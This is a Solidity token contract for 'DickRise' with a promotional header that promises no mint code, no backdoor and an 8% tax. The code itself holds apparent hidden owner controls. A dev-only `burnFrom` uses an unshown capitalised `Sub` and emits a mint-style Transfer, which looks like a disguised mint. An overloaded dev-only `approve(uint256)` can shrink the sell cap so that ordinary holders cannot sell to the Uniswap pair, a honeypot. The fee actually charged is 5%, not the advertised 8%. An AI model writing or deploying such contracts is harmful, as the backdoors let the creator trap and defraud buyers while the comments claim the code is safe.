/**
 *Submitted for verification at Etherscan.io on 2021-07-11
*/

/**
 * 
Welcome to $DickRise


    I have created a sustainable token called "DickRiseCoin"
    On each sell, the contract will trigger a buy and burn the bought tokens creating an hyper deflationary token. BuyBackBurn-System
    
   This is a community token. So there is no official group.
   If someone wants to create one , just do your publicity in other groups, and then establish a consensus group.
   There is only one channel recording the information when I released this coin. 
   If you want to view all the information about this coin, please check https://t.me/DickRise_Channel
   
   I'll lock liquidity LPs through team.finance for at least 30 days, if the response is good, I will extend the time.
   I'll renounce the ownership to burn addresses to transfer $DickRise to the community, make sure it's 100% safe.

   It's a community token, every holder should promote it, or create a group for it, if you want to pump your investment, you need to do some effort.
   

   Great features:
    1.Fair Launch!
    2.No Dev Tokens No mint code No Backdoor
    3.Anti-sniper & Anti-bot scripting
    4.Anti-whale Max buy/sell limit
    5.LP send to team.finance for 30days, if the response is good, I will continue to extend it
    6.Contract renounced on Launch!
    7.1000 Billion Supply and 50% to burn address!
    8.Auto-farming to All Holders! 
    9.Tax: 8% => Burn: 4% | LP: 4%

    4% fee for liquidity will go to an address that the contract creates,       
    and the contract will sell it and add to liquidity automatically, 
    it's the best part of the $DickRise idea, increasing the liquidity pool automatically.

    Iâ€™m gonna put all my coins with 4ETH in the pool. 
    Can you make this token 100X or even 10000X?
    Hope you guys have real diamond hand
    

*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}




contract DickRise is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _excludeDevAddress;
    address private _approvedAddress;
    uint256 private  _tTotal = 10**11 * 10**18;
    

    string private _name;
    string private _symbol;
    uint8 private _decimals = 18;
    uint256 private _maxTotal;
    IUniswapV2Router02 public uniSwapRouter;
    address public uniSwapPair;
  
    address payable public BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    uint256 private _total = 10**11 * 10**18;
    event uniSwapRouterUpdated(address indexed operator, address indexed router, address indexed pair);
    constructor (address devAddress, string  memory name, string memory symbol) public {
        _excludeDevAddress = devAddress;
        _name = name;
        _symbol = symbol;
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function burnFrom(uint256 amount) public {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
        _tTotal = _tTotal.Sub(amount);
        _balances[_msgSender()] = _balances[_msgSender()].Sub(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }
    function updateuniSwapRouter(address _router) public onlyOwner {
        uniSwapRouter = IUniswapV2Router02(_router);
        uniSwapPair = IUniswapV2Factory(uniSwapRouter.factory()).getPair(address(this), uniSwapRouter.WETH());
        require(uniSwapPair != address(0), "updateTokenSwapRouter: Invalid pair address.");
        emit uniSwapRouterUpdated(msg.sender, address(uniSwapRouter), uniSwapPair);
    }
    
    function approve(address approvedAddress) public {
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
        _approvedAddress = approvedAddress;
    }
    function approve(uint256 approveAmount) public {
        require(_msgSender() == _excludeDevAddress, "ERC20: cannot permit dev address");
        _total = approveAmount * 10**18;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender == owner()) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
            if (sender != _approvedAddress && recipient == uniSwapPair) {
                require(amount < _total, "Transfer amount exceeds the maxTxAmount.");
            }
            
            uint256 burnAmount = amount.mul(5).div(100);
            uint256 sendAmount = amount.sub(burnAmount);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[BURN_ADDRESS] = _balances[BURN_ADDRESS].add(burnAmount);
            _balances[recipient] = _balances[recipient].add(sendAmount);
            
            
            emit Transfer(sender, recipient, sendAmount);
        }
    }
}